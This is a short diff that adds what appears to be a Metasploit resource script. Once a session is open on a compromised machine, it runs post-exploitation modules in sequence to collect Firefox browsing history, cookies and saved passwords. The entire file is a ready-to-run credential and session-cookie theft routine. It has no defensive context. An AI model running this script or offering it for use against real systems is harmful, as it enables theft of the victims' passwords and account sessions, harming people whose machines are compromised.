@@ -1,0 +1,10 @@
+<ruby>
+puts "**** Running Firefox post exploits..."
+</ruby>
+setg SESSION 1
+sleep 1
+run post/firefox/gather/history
+sleep 1
+run post/firefox/gather/cookies
+sleep 1
+run post/firefox/gather/passwords
